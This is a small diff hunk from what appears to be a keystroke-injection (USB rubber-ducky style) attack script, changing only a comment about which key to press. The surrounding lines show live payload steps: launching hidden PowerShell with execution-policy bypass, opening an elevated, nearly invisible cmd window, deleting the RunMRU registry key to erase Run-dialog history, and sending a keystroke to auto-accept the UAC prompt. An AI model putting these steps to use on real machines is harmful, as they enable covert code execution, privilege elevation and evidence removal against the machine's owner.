@@ -77,7 +77,7 @@ Q DELAY 750
 Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f' -Verb runAs"
 Q ENTER
 
-# Bypass UAC
+# Bypass UAC Chenge "ALT j" according to your language i.e. for us it is ALT o
 Q DELAY 750
 Q ALT j
 Q DELAY 750
